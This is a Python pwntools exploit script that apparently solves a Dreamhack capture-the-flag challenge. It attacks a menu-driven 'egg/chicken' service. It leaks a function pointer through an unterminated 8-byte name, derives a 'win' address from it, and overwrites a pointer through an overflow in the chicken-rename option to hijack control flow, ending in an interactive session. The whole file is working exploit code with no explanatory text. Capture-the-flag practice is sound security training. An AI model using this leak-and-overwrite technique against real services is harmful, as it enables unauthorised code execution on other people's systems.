from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 8937
r = remote(HOST, PORT)

def create_egg():
    r.sendlineafter(b'> ', b'1')

def rename_egg(name):
    r.sendlineafter(b'> ', b'2')
    r.sendafter(b': ', name)

def print_egg():
    r.sendlineafter(b'> ', b'3')

def observe_egg():
    r.sendlineafter(b'> ', b'4')

def rename_chicken(name):
    r.sendlineafter(b'> ', b'5')
    r.sendafter(b': ', name)

create_egg()
rename_egg(b'A'*8)
print_egg()

r.recvuntil(b'A'*8)
func = u64(r.recv(8))
win = func ^ 0x90000

observe_egg()
rename_chicken(b'A'*8 + p64(win))
observe_egg()

r.interactive()